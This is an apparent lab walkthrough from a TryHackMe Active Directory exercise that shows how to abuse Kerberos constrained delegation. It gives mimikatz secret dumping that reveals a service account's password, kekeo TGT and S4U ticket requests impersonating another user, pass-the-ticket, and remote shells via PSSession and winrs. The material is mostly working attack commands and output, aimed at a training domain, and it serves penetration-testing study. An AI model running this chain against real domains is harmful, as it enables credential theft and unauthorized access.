# Kerberos Delegation

Guide based on Tryhackme AD and [this post](https://benheater.com/tryhackme-exploiting-active-directory/).

## Enumerate Available Kerberos Delegates

Constrained Delegation restricts what services an account can be delegated to, limiting exposure if an account is compromised. The following are examples of services that can be configured for delegation:
* **HTTP** - Used for web applications to allow pass-through authentication using AD credentials.
* **CIFS** - Common Internet File System is used for file sharing that allows delegation of users to shares.
* **LDAP** - Used to delegate to the LDAP service for actions such as resetting a user's password.
* **HOST** - Allows delegation of account for all activities on the host.
* **MSSQL** - Allows delegation of user accounts to the SQL service for pass-through authentication to databases.

1. Enumerate with PowerView to see possible exploitable account.
```
PS C:\>Import-Module C:\Tools\PowerView.ps1 
PS C:\>Get-NetUser -TrustedToAuth
```

In this example, `svcIIS` is exploitable account. And we see the it allows HTTP and WSMAN

2. Further enumerate with mimikatz once identified
```
mimikatz.exe
token::elevate
lsadump::secrets
```

From the output you can see that the it shows the password:
```
Secret  : _SC_thmwinauth / service 'thmwinauth' with username : svcIIS@za.tryhackme.loc
cur/text: Password1@
```
Note: make sure to exit out of Mimikatz after the token::elevate command, otherwise the tickets will be loaded in the wrong context later on.
or run `token::revert` on mimikatz before continuing.

Alternatively, we can use `impacket-secretsdump`.

3. Now, we request TGT and perform an attack with kekeo.exe

We first need to generate a TGT that can be used to generate tickets for the HTTP and WSMAN services:
```
C:\Tools\kekeo\x64\kekeo.exe

kekeo # tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:Password1@
```

The output will show the ticket generated, focus on the last line of output
```
Realm        : za.tryhackme.loc (za)
User         : svcIIS (svcIIS)
CName        : svcIIS   [KRB_NT_PRINCIPAL (1)]
SName        : krbtgt/za.tryhackme.loc  [KRB_NT_SRV_INST (2)]
Need PAC     : Yes
Auth mode    : ENCRYPTION KEY 23 (rc4_hmac_nt      ): 43460d636f269c709b20049cee36ae7a
[kdc] name: THMDC.za.tryhackme.loc (auto)
[kdc] addr: 172.31.1.101 (auto)
  > Ticket in file 'TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi'
```

Then using the ticket generated, we request a S4U TGS on behalf of t1_trevor.jones to the HTTP and WSMAN service on THMSERVER1 using the TGT.
```
kekeo # tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc

kekeo # tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:wsman/THMSERVER1.za.tryhackme.loc
```

4. Now, we run mimikatz and pass the hash from http and wsman the gain escalation.
```
mimikatz.exe
privilege::debug
kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
```

5. From here we can either run 2 option to gain shell.
First one is the exit mimikatz and use powershell
```
New-PSSession -ComputerName thmserver1.za.tryhackme.loc
Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc
```

You will see that you escalated to trevor.jones when typing whoami:
```
[thmserver1.za.tryhackme.loc]: PS C:\Users\t1_trevor.jones\Documents> whoami
za\t1_trevor.jones
```

Second option is to directly gain a shell through mimikatz:
```
mimikatz # kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi

kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi

misc::cmd
```

Type `klist` and you will see 2 logons ticket

Then run this to start a WinRM session as t1_trevor.jones on THMSERVER1 on normal cmd:
```
winrs -r:THMSERVER1.za.tryhackme.loc cmd
```

